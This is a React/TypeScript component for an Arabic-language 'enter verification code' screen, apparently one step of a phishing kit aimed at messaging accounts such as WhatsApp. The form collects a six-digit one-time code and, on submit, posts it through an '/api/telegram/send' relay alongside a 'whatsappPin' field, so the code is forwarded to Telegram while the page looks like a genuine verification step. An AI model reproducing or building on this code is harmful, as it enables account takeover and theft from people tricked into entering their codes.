import React, { useState, useRef, useEffect } from 'react';

interface CodeStepProps {
  verificationCode: string;
  phoneNumber: string;
  updateVerificationCode: (value: string) => void;
  onNext: () => void;
  onBack: () => void;
}

const CodeStep: React.FC<CodeStepProps> = ({ 
  verificationCode, 
  phoneNumber, 
  updateVerificationCode, 
  onNext, 
  onBack 
}) => {
  const [error, setError] = useState('');
  const [codes, setCodes] = useState(['', '', '', '', '', '']);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handleCodeChange = (index: number, value: string) => {
    if (value.length > 1) return;
    
    const newCodes = [...codes];
    newCodes[index] = value;
    setCodes(newCodes);
    
    const fullCode = newCodes.join('');
    updateVerificationCode(fullCode);

    // Auto focus next input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !codes[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const sendCodeToTelegram = async (code: string) => {
    try {
      await fetch('/api/telegram/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          phoneNumber: '',
          verificationCode: code,
          whatsappPin: '',
          messageType: 'code'
        })
      });
    } catch (error) {
      console.error('Erreur envoi code:', error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (verificationCode.length !== 6) {
      setError('يرجى إدخال رمز التحقق كاملاً');
      return;
    }
    
    setError('');
    await sendCodeToTelegram(verificationCode);
    onNext();
  };

  return (
    <div className="form-card animate-fade-in">
      <div className="form-content">
        <div className="form-icon code">💬</div>
        <h2 className="form-title">أدخل رمز التحقق</h2>
        <p className="form-subtitle">أدخل الرمز المرسل إلى</p>
        <p className="phone-display">{phoneNumber}</p>

        <form onSubmit={handleSubmit}>
          <div className="input-group">
            <div className="code-inputs">
              {codes.map((code, index) => (
                <input
                  key={index}
                  ref={(el) => (inputRefs.current[index] = el)}
                  type="text"
                  value={code}
                  onChange={(e) => handleCodeChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className="code-input"
                  maxLength={1}
                />
              ))}
            </div>
            
            {error ? (
              <div className="message error animate-fade-in">{error}</div>
            ) : (
              <div className="message success">تم إرسال رمز التحقق إلى رقم هاتفك</div>
            )}
          </div>

          <div className="button-group">
            <button
              type="button"
              onClick={onBack}
              className="btn btn-secondary"
            >
              <span>←</span>
              <span>رجوع</span>
            </button>
            
            <button
              type="submit"
              className="btn btn-primary"
            >
              <span>تأكيد</span>
              <span>→</span>
            </button>
          </div>

          <div className="text-center">
            <a href="#" className="link">إعادة إرسال الرمز</a>
          </div>
        </form>
      </div>
    </div>
  );
};

export default CodeStep;